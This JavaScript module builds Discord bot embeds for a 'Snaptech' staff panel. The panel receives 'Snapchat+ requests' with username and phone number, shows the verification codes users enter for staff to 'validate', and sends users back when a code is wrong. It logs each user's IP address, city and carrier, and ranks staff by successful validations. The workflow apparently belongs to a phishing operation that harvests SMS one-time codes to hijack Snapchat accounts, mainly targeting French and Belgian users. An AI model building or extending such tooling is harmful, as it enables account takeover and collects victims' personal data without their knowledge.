import { EmbedBuilder } from "discord.js";
import { getOperatorColor, STATUS_COLORS } from "./colors.js";
import { formatPhone, formatIP, getCarrierName, formatDate } from "./formatters.js";

export function buildNewRequestEmbed(row) {
    const color = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip = row.ip_address;

    return new EmbedBuilder()
        .setTitle("📱 New Snapchat+ Request")
        .setColor(color)
        .setDescription("**Operator:** " + carrier + "  |  **Country:** " + (row.country || "Unknown"))
        .addFields(
            { name: "👤 Username", value: "``" + row.username + "``", inline: true },
            { name: "📞 Phone", value: formatPhone(row.phone), inline: true },
            { name: "📡 Operator", value: "``" + carrier + "``", inline: true },
            { name: "🌍 Country", value: "``" + (row.country || "Unknown") + "``", inline: true },
            { name: "🏙️ City", value: "``" + (row.city || "Unknown") + "``", inline: true },
            { name: "🌐 IP", value: formatIP(ip), inline: true },
            { name: "⏰ Date", value: formatDate(row.created_at), inline: false }
        )
        .setFooter({ text: "🆔 ID: " + row.id + "  •  ⏳ Waiting for staff" })
        .setTimestamp();
}

export function buildCodeSubmittedEmbed(row) {
    const color = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const code = row.staff_code || "N/A";
    const len = row.code_length || 6;
    const ip = row.ip_address;

    return new EmbedBuilder()
        .setTitle("🔓 Code Submitted by User")
        .setColor(color)
        .setDescription("The user entered a **" + len + "-digit** code. Please verify below.")
        .addFields(
            { name: "👤 Username", value: "``" + row.username + "``", inline: true },
            { name: "📞 Phone", value: formatPhone(row.phone), inline: true },
            { name: "🔢 Entered Code", value: "```\n" + code + "\n```", inline: false },
            { name: "📡 Operator", value: "``" + carrier + "``", inline: true },
            { name: "🌍 Country", value: "``" + (row.country || "Unknown") + "``", inline: true },
            { name: "🏙️ City", value: "``" + (row.city || "Unknown") + "``", inline: true },
            { name: "🌐 IP", value: formatIP(ip), inline: true }
        )
        .setFooter({ text: "🆔 ID: " + row.id + "  •  ⏳ Awaiting staff validation" })
        .setTimestamp();
}

export function buildRetryEmbed(row) {
    const color = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip = row.ip_address;

    return new EmbedBuilder()
        .setTitle("🔄 User Redirected — New Code Needed")
        .setColor(color)
        .setDescription("The previous code was **incorrect**. The user has been redirected to enter a new code.")
        .addFields(
            { name: "👤 Username", value: "``" + row.username + "``", inline: true },
            { name: "📞 Phone", value: formatPhone(row.phone), inline: true },
            { name: "📡 Operator", value: "``" + carrier + "``", inline: true },
            { name: "🌍 Country", value: "``" + (row.country || "Unknown") + "``", inline: true },
            { name: "🏙️ City", value: "``" + (row.city || "Unknown") + "``", inline: true },
            { name: "🌐 IP", value: formatIP(ip), inline: true }
        )
        .setFooter({ text: "🆔 ID: " + row.id + "  •  🔧 Choose an action below" })
        .setTimestamp();
}

export function buildStatsEmbed(stats, todayStats) {
    const embed = new EmbedBuilder()
        .setTitle("📊 Global Statistics")
        .setColor(0x3b82f6)
        .setDescription("Real-time platform statistics")
        .addFields(
            { name: "📋 Total Requests", value: "`" + stats.total + "`", inline: true },
            { name: "⏳ Pending", value: "`" + stats.pending + "`", inline: true },
            { name: "👤 Processing", value: "`" + stats.processing + "`", inline: true },
            { name: "⏱️ Waiting Code", value: "`" + stats.waiting + "`", inline: true },
            { name: "🔓 Code Submitted", value: "`" + stats.submitted + "`", inline: true },
            { name: "✅ Completed", value: "`" + stats.completed + "`", inline: true },
            { name: "🔄 Retry", value: "`" + stats.retry + "`", inline: true },
            { name: "❌ Wrong Number", value: "`" + stats.wrong + "`", inline: true },
            { name: "🚫 Banned IPs", value: "`" + stats.banned + "`", inline: true }
        );

    if (stats.total > 0) {
        const completionRate = Math.round((stats.completed / stats.total) * 100);
        embed.addFields({
            name: "📈 Completion Rate",
            value: "`" + completionRate + "%`",
            inline: false
        });
    }

    embed.addFields({
        name: "📅 Today",
        value: "Requests: `" + todayStats.requests + "`  |  Completed: `" + todayStats.completed + "`",
        inline: false
    });

    embed.setFooter({ text: "📡 Snaptech Stats  •  Live data" }).setTimestamp();
    return embed;
}

export function buildOperatorStatsEmbed(operatorStats) {
    const embed = new EmbedBuilder()
        .setTitle("📡 Operator Distribution")
        .setColor(0x8b5cf6)
        .setDescription("Requests by mobile operator");

    operatorStats.forEach((row, i) => {
        const carrier = getCarrierName(row.operator);
        const emoji = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣"][i] || "•";
        embed.addFields({
            name: emoji + " " + carrier,
            value: "`" + row.count + "` requests",
            inline: true
        });
    });

    embed.setFooter({ text: "📡 Snaptech Operators" }).setTimestamp();
    return embed;
}

export function buildLeaderboardEmbed(rows, limit) {
    const embed = new EmbedBuilder()
        .setTitle("🏆 Staff Leaderboard")
        .setColor(0xf59e0b)
        .setDescription("Top " + limit + " staff by code validations");

    if (rows.length === 0) {
        embed.setDescription("🏆 Top " + limit + " staff by code validations\n\n*No validations recorded yet.*");
    } else {
        rows.forEach((row, i) => {
            const medal = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"][i] || "•";
            embed.addFields({
                name: medal + " " + row.staff,
                value: "✅ `" + row.validations + "` validations",
                inline: false
            });
        });
    }

    embed.setFooter({ text: "🏆 Snaptech Leaderboard" }).setTimestamp();
    return embed;
}

export function buildHourlyStatsEmbed(hourlyData) {
    const embed = new EmbedBuilder()
        .setTitle("📈 Activity (Last 24h)")
        .setColor(0x10b981)
        .setDescription("Requests per hour");

    if (hourlyData.length === 0) {
        embed.setDescription("📈 Activity (Last 24h)\n\n*No activity in the last 24 hours.*");
    } else {
        let chart = "```\n";
        hourlyData.forEach(row => {
            const hour = String(row.hour).padStart(2, "0") + "h";
            const bar = "█".repeat(Math.min(row.count, 20));
            chart += hour + " " + bar + " " + row.count + "\n";
        });
        chart += "```";
        embed.setDescription("📈 Activity (Last 24h)\n" + chart);
    }

    embed.setFooter({ text: "📈 Snaptech Activity" }).setTimestamp();
    return embed;
}

export function buildStaffActivityEmbed(activityData) {
    const embed = new EmbedBuilder()
        .setTitle("👥 Staff Activity")
        .setColor(0xec4899)
        .setDescription("Actions by staff members");

    if (activityData.length === 0) {
        embed.setDescription("👥 Staff Activity\n\n*No activity recorded yet.*");
    } else {
        const grouped = {};
        activityData.forEach(row => {
            if (!grouped[row.staff]) grouped[row.staff] = {};
            grouped[row.staff][row.action] = row.count;
        });

        Object.entries(grouped).forEach(([staff, actions]) => {
            const lines = Object.entries(actions)
                .map(([action, count]) => "• " + action + ": `" + count + "`")
                .join("\n");
            embed.addFields({
                name: "👤 " + staff,
                value: lines,
                inline: true
            });
        });
    }

    embed.setFooter({ text: "👥 Snaptech Staff" }).setTimestamp();
    return embed;
}

export function buildPanelEmbed() {
    return new EmbedBuilder()
        .setTitle("🎛️ Staff Panel")
        .setDescription("Requests appear here automatically.\n\n**🎨 Embed Colors:**")
        .addFields(
            { name: "🔴 Red", value: "SFR / Telenet", inline: true },
            { name: "🟠 Orange", value: "Orange / Orange Belgium", inline: true },
            { name: "🔵 Blue", value: "Bouygues / BASE", inline: true },
            { name: "🟣 Purple", value: "Proximus", inline: true },
            { name: "🟡 Yellow", value: "Other operator", inline: true }
        )
        .setColor(0x000000)
        .setFooter({ text: "🎛️ Snaptech Panel" })
        .setTimestamp();
}
